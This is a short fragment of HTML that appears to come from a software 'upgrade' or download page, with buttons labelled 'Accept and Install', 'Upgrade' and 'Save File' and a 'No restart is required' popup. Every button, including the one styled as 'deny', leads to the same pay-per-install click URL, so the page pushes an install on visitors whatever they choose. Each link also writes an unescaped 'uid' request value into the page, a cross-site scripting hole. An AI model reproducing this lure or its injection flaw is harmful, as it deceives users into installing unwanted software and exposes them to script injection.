...
<h3>LEGAL INFORMATION</h3>
   ...
   <p>If you would like to contact us via e-mail, please send a message <a href="contact.html">here</a></p>
      ...
      <a href="http://macfctp.com/ppi/click-yav?uid=<%=Request("uid")%>" class="download showmodal">Accept and Install</a>
    </div>
  </div>
...
<!--popup-->
 ...
 <p class="restart">No restart is required</p>
    ...
    <div class="buttons">
      <a href="http://macfctp.com/ppi/click-yav?uid=<%=Request("uid")%>" class="showmodal accept">Upgrade</a>
      <a href="http://macfctp.com/ppi/click-yav?uid=<%=Request("uid")%>" class="showmodal deny">Save File</a>
        </div>
<div class="close">
